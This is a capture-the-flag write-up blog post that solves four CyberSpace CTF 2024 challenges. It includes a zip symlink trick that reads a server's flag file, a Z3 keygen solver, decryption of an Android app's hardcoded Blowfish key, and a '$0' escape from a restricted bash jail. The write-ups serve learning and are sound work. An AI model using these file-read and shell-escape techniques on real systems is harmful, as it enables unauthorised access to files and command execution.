---
title: 'csctf 2024'
description: 'Here is the solutions to some of the challenges in CyberSpace CTF'
pubDate: 'Aug 31 2024'
heroImage: 
  src: '/blog-placeholder-1.jpg'
  alt: ''
order: 1
tags: ["writeup"]
---

# Background Information

I did this with team lazy bums but we did trash as usual.

## Web

### ZipZone
> I was tired of trying to find a good file server for zip files, so I made my own! It's still a work in progress, but I think it's pretty good so far.

Ok, so first this we can see is that we can upload a file and that we can view / download whatever we extracted. 

Before we start, let's analyze the source code of the web application.

```python
@app.route("/", methods=["GET", "POST"])
def upload():
    if request.method == "GET":
        return render_template("index.html")

    if "file" not in request.files:
        flash("No file part!", "danger")
        return render_template("index.html")

    file = request.files["file"]
    if file.filename.split(".")[-1].lower() != "zip":
        flash("Only zip files allowed are allowed!", "danger")
        return render_template("index.html")

    upload_uuid = str(uuid.uuid4())
    filename = f"{upload_dir}raw/{upload_uuid}.zip"
    file.save(filename)
    subprocess.call(["unzip", filename, "-d", f"{upload_dir}files/{upload_uuid}"])
    flash(
        f'Your file is at <a href="/files/{upload_uuid}">{upload_uuid}</a>!', "success"
    )
    logging.info(f"User uploaded file {upload_uuid}.")
    return redirect("/")


@app.route("/files/<path:path>")
def files(path):
    try:
        return send_from_directory(upload_dir + "files", path)
    except PermissionError:
        abort(404)


@app.errorhandler(404)
def page_not_found(error):
    return render_template("404.html")

```

Ignoring all the basic web application setup, what we really care about is WHAT WE CAN PREDICTABLY CONTROL. So we should only analyze the `subprocess.call()` function since that is the only "dangerous" function we can mess with.

A tip is that whenever we deal with compressed files, such as `zip` or `tar` the problem of `symbolic links` come up. Symbolic links are basically files that "point" to other files. Vulnerable web applications such as this do not verify if the decompressed file is a symlink. So with that fact, we can build the process.

1. Create a symlink to flag
2. Upload the symlink
3. Profit $$$$$$

So lets symlink and zip it. (The flag stuff was based on analysis on the Dockerfile)

```bash
ln -s ../../../home/user/flag.txt flag
zip -r flag.zip flag
```

And... we profit! 

> CSCTF{5yml1nk5_4r3_w31rd}

## Reverse Engineering

### Key

This is a basic keygen + password checking crackme. What we do is just find the algorithm in a disassembler like `Ghidra` and put the algorithm in a Z3 script.

Solution:

```python
from z3 import *

# Initialize a solver
solver = Solver()

# Define the 32-byte key as a list of BitVecs
key = [BitVec(f'key_{i}', 8) for i in range(32)]

# Define the values of v6
v6 = [
    67, 164, 65, 174, 66, 252, 115, 176, 111, 114, 94, 168, 101, 242, 81, 206,
    32, 188, 96, 164, 109, 70, 33, 64, 32, 90, 44, 82, 45, 94, 45, 196
]

# Define the constraints based on the program logic
for i in range(32):
    transformed_value = (i % 2 + 1) * (i ^ key[i])
    solver.add(transformed_value == v6[i])

# Check if the solution exists
if solver.check() == sat:
    model = solver.model()
    result_key = ''.join([chr(model[key[i]].as_long()) for i in range(32)])
    print("Key found:", result_key)
else:
    print("No solution found.")

```
> CSCTF{u_g0T_it_h0OrAy6778462123}

### Encryptor

This is an android web application. So what we can do is use JADX decompiler to analyze the java kotlin code that makes up this application

In `resources` we get a basic enc.txt file with content:

```
OIkZTMehxXAvICdQSusoDP6Hn56nDiwfGxt7w/Oia4oxWJE3NVByYnOMbqTuhXKcgg50DmVpudg=
```

This is encrypted not encoded, so we need to find the encryption algorithm for this.

Upon more investigation we find the encryption algorithm in `sources/com/example/encryptor/MainActivity.java`. It's blowfish. 

```java
  private String getKey() {
        return new String(Base64.decode("ZW5jcnlwdG9yZW5jcnlwdG9y".getBytes(), 0));
    }

    private String encryptText(String str) throws InvalidKeyException, UnsupportedEncodingException, NoSuchPaddingException, NoSuchAlgorithmException, IllegalBlockSizeException, BadPaddingException {
        SecretKeySpec secretKeySpec = new SecretKeySpec(getKey().getBytes("UTF-8"), "Blowfish");
        Cipher instance = Cipher.getInstance("Blowfish");
        if (instance != null) {
            instance.init(1, secretKeySpec);
            return Build.VERSION.SDK_INT >= 26 ? new String(Base64.encode(instance.doFinal(str.getBytes("UTF-8")), 0)) : "";
        }
        throw new Error();
    }
```

So we can just make a script in python that solves this.

```python
from Crypto.Cipher import Blowfish
from base64 import b64decode

def decrypt_text(encrypted_text):
    # The key used in the Java code
    key = "encryptorencryptor".encode('utf-8')

    # Decode the Base64 encoded string
    encrypted_data = b64decode(encrypted_text)

    # Initialize the Blowfish cipher in ECB mode
    cipher = Blowfish.new(key, Blowfish.MODE_ECB)

    # Decrypt the data
    decrypted_data = cipher.decrypt(encrypted_data)

    # Remove potential padding added during encryption (since Blowfish is a block cipher)
    decrypted_text = decrypted_data.rstrip(b"\x00")

    return decrypted_text.decode('utf-8')

# Example usage
encrypted_text = "OIkZTMehxXAvICdQSusoDP6Hn56nDiwfGxt7w/Oia4oxWJE3NVByYnOMbqTuhXKcgg50DmVpudg="
decrypted_text = decrypt_text(encrypted_text)
print("Decrypted text:", decrypted_text)

```

And we get the flag! 

> CSCTF{3ncrypt0r_15nt_s4Fe_w1th_4n_h4Rdc0d3D_k3y!}

## Sandbox

### Baby Pybash

So we enter a "python bash jail" where we are restricted from certain characters in input to make commands. Let's analyze the source code to see what we are missing.

```python
#!/usr/local/bin/python3 -u
import subprocess
import re


def restrict_input(command):
    pattern = re.compile(r'[a-zA-Z*^\,,;\\!@/#?%`"\'&()-+]|[^\x00-\x7F]')
    if pattern.search(command):
        raise ValueError("that's not nice!")
    return command


def execute_command(command):
    safe = restrict_input(command)
    result = subprocess.run(safe, stdout=True, shell=True)
    return result.stdout


print("Welcome to Baby PyBash!\n")
cmd = input("Enter a bash command: ")
output = execute_command(cmd)
print(output)
```
Wow. We are restricted from the entire alphabet and other special fonts that would bypass like italics. However, we are allowed certian special characters and numbers. 

So what we can do is call `$0` since that calls /bin/bash. Then we can profit!

```bash
== proof-of-work: disabled ==
Welcome to Baby PyBash!

Enter a bash command: $0
ls
chall.py
flag.txt
run.sh
cat flag.txt
CSCTF{b4sH_w1z4rd_0r_ju$t_ch33s3_m4st3r?_c1d4eeb2a}

```

> CSCTF{b4sH_w1z4rd_0r_ju$t_ch33s3_m4st3r?_c1d4eeb2a}